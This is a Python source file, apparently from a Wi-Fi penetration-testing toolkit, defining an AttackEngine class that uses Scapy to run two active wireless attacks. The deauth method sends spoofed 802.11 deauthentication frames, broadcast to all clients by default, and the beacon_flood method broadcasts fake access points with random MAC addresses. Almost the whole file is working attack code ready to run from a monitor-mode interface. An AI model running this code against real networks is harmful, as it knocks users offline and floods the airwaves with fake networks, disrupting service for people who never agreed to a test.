#!/usr/bin/env python3
"""
Attack Module - Active Pentest Capabilities
Includes Deauthentication and Fake AP (Beacon Flood) attacks.
"""

import logging
import time
import random
from typing import List, Optional
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, sendp

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackEngine:
    """
    Handles active attacks (Deauth, FakeAP).
    Requires monitor mode on the interface.
    """
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface

    def deauth(self, target_bssid: str, client_mac: str = 'FF:FF:FF:FF:FF:FF', count: int = 10):
        """
        Perform Deauthentication attack.
        
        Args:
            target_bssid: AP MAC address (BSSID)
            client_mac: Client MAC (default: Broadcast FF:FF:FF:FF:FF:FF)
            count: Number of frames to send
        """
        try:
            # Addr1: Destination (Client)
            # Addr2: Source (AP/BSSID)
            # Addr3: BSSID (AP)
            # Reason 7: Class 3 frame received from nonassociated station
            packet = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
            
            logger.info(f"Starting Deauth: {target_bssid} -> {client_mac} ({count} packets)")
            
            for i in range(count):
                sendp(packet, iface=self.interface, verbose=False)
                # Small sleep to prevent instant flood and allow context switch
                time.sleep(0.1)
                
            logger.info("Deauth attack completed")
            return True
            
        except Exception as e:
            logger.error(f"Deauth failed: {e}")
            raise e

    def beacon_flood(self, ssid_list: List[str], count: int = 100):
        """
        Perform Beacon Flood (Fake AP) attack.
        
        Args:
            ssid_list: List of SSIDs to broadcast
            count: Total number of frames to send
        """
        try:
            logger.info(f"Starting Beacon Flood with {len(ssid_list)} SSIDs")
            
            for i in range(count):
                ssid = random.choice(ssid_list)
                # Random BSSID
                src_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                
                # Create Beacon
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=src_mac, addr3=src_mac)
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                rsn = Dot11Elt(ID=48, info=b'\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x04\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00')
                
                # Complete packet with 1Mbps rate and channel 6
                packet = RadioTap() / dot11 / beacon / essid / rsn
                
                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(0.01)
                
            logger.info("Beacon flood completed")
            return True
            
        except Exception as e:
            logger.error(f"Beacon flood failed: {e}")
            raise e

if __name__ == "__main__":
    print("Attack Module Test (requires monitor mode interface)")
    # Testing logic would require actual hardwre
    pass
